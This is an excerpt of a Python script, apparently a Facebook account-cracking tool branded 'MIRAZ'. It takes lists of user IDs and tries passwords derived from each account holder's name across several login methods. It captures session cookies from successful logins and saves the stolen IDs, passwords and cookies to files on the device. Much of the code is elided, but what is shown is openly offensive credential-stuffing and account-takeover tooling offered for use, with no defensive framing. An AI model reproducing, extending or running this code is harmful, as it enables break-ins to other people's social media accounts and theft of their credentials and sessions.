...
logo =                                          """            
.88b  d88.      d888888b      d8888b.       .d8b.       d88888D 
88'YbdP`88        `88'        88  `8D      d8' `8b      YP  d8' 
88  88  88         88         88oobY'      88ooo88         d8'  
88  88  88         88         88`8b        88~~~88        d8'   
88  88  88        .88.        88 `88.      88   88       d8' db 
YP  YP  YP      Y888888P      88   YD      YP   YP      d88888P 
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            MIRAZ AFRIDI
\033[1;37m Facebook:          Md Thosar Mia 
\033[1;37m Github  :            M1R4Z-BRO
...
def sarfraz():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://chat.whatsapp.com/DH8BA9Ev4nq81qXnCTDEa6')
        pass
    elif select =='F':
        os.system('xdg-open https://facebook.com/groups/485867669680258/')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        SSB(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[MIRAZ] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);MIRAZ = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{R} [MIRAZ-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/MIRAZ_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/MIRAZ_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/MIRAZ_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[MIRAZ] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[MIRAZ] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[MIRAZ] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [MIRAZ-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/MIRAZ_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
...
def p_dump():
    ...
    try:
        ...
        print(f"File Saved To  {filepath} ")
        print(47*'-')
        input("Press enter to back MIRAZ Menu ")
        SSB(allkey)
    except Exception as e:
        print("Error : %s"%e) 
